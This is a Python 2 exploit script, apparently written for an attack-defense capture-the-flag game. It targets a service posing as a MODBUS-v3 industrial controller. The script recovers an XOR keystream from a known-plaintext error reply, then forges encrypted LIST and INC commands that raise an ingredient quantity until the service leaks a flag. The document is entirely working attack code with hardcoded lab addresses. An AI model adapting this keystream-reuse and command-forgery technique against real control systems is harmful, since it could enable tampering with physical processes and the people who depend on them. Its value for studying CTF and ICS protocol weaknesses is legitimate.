import sys

class Exploit():
    def x(self,a,b):
        l=0
        ret=""
        if len(a)>len(b):
            l=len(b)
        else:
            l=len(a)
        for i in range(0,l):
            ret+=chr(bytearray(a)[i]^bytearray(b)[i])

        return ret

    def execute(self,ip,port,flag_id):
        import binascii
        import socket
        import re

        #got=bytearray("\xc4\x23\xb9\x61\x2d\xbc\xcc\x9f\xea\x1d\xb4\xa0\x43\x1b\xfc\xbf\x0d\x88\x87\x42\x3d\xe5")
        orig=bytearray("CODE=UNKNOW PROTOCOL\n\n")
        comm=bytearray("MODBUS-v3\nCODE=INFO\n\n")
        info=bytearray("CODE=OK\nDESC=AutoServ DLF-17500\nPROTOCOL=MODBUS-v3\nSTATUS=OK\nVERSION=2.3.1")
        lst=bytearray("MODBUS-v3\nCODE=LIST\n\n")


        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        
        sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a")+("\x31"*21+"\x00"))
        oracle=sock.recv(1024)
        keystream=self.x(orig,oracle)


        print binascii.hexlify(oracle)
        print binascii.hexlify(keystream)
        print "OOO: "+binascii.hexlify(self.x(keystream,comm))

        sock.close()
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a")+self.x(keystream,comm))
        info_data=sock.recv(len(info))
        keystream2=self.x(info_data,info)
        print self.x(keystream2,info_data)
        sock.close()

        sock.close()

        for zs in range(0,100):
            sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a")+self.x(keystream2,lst))
            lst_data=sock.recv(1024)
            lst_dec=self.x(keystream2,lst_data)
            ingredient=re.search("([A-Za-z]+)=[0-9]+ mg",lst_dec).group(1)
            sock.close()

            bingo=bytearray("MODBUS-v3\nCODE=INC\nINGREDIENT=%s\nVALUE=71\n\n"%ingredient)
            print bingo
            sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a")+self.x(keystream2,bingo))
            bingo_data=sock.recv(1024)
            sock.close()
            r=self.x(keystream2,bingo_data)
            print r
            try:
                self.flag=re.search("(FLG[a-zA-Z0-9]+)",r).group(0)
                break
            except:
                pass
        

    def result(self):
        return {'FLAG' : self.flag }

e=Exploit()
#e.execute("10.105.0.54",8888,"")
e.execute("10.105.0.54",6699,"")

#10.13.37.49
print e.result()